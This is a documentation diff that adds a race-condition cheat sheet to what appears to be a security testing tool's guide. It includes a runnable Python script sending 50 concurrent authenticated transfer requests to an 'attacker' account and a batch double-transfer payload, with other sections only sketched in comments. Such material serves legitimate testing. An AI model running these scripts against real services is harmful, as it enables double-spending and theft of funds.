@@ -602,3 +602,66 @@ findings with exploit proofs automatically.
 | Primitive id | Coverage |
 |---|---|
 | `concurrencyHarness` | parallel race burst with divergence oracle |
+
+---
+
+## Cheat Sheet — Race Condition Patterns
+
+### TOCTOU (Time-of-Check to Time-of-Use)
+
+```python
+import threading, requests
+
+# Race window: check balance → deduct balance
+# Two requests check balance simultaneously, both see full balance
+
+def exploit():
+    url = "https://target.com/api/transfer"
+    data = {"to": "attacker", "amount": 1000}
+    headers = {"Cookie": "session=valid_token"}
+    return requests.post(url, json=data, headers=headers)
+
+# Send 50 concurrent requests
+from concurrent.futures import ThreadPoolExecutor
+with ThreadPoolExecutor(max_workers=50) as executor:
+    results = list(executor.map(lambda _: exploit(), range(50)))
+# Check for duplicate transfers
+```
+
+### Single-Packet Attack (HTTP/2)
+
+```python
+# HTTP/2 multiplexing: multiple requests in single TCP packet
+# Tool: Turbowlence
+# Or custom h2 implementation
+```
+
+### Batch Request Race
+
+```python
+# Send batch of operations where order matters
+payload = {
+    "operations": [
+        {"method": "POST", "path": "/api/transfer", "body": {"amount": 1000}},
+        {"method": "POST", "path": "/api/transfer", "body": {"amount": 1000}},
+    ]
+}
+# If processed concurrently, both may succeed
+```
+
+### Payment Double-Spend
+
+```python
+# Race on payment confirmation
+# Request 1: apply coupon (check: valid → apply)
+# Request 2: apply coupon (check: still valid → apply)
+# Result: coupon applied twice
+```
+
+### Integer Overflow Race
+
+```python
+# Race on balance counter
+# Multiple concurrent adds may overflow
+# Or concurrent subtract may go negative
+```
